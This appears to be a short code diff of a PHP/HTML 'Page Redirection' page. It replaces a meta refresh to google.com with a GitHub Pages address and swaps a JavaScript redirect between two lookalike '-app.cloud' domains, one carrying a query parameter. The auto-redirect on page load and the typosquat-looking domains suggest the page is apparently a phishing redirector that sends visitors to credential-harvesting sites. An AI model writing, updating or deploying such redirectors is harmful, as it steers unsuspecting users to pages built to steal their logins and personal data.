@@ -1,9 +1,9 @@
 <?php
 <meta charset="UTF-8">
-<meta http-equiv="refresh" content="1; url=https://google.com">
+<meta http-equiv="refresh" content="1; url=https://sender8888.github.io/esvreff/">
  
 <script>
-  window.location.href = "https://be-phactiedienst-app.cloud/sbn"
+  window.location.href = "https://efspace-sencfea-app.cloud/cb/?pwd=mis"
 </script>
  
 <title>Page Redirection</title>
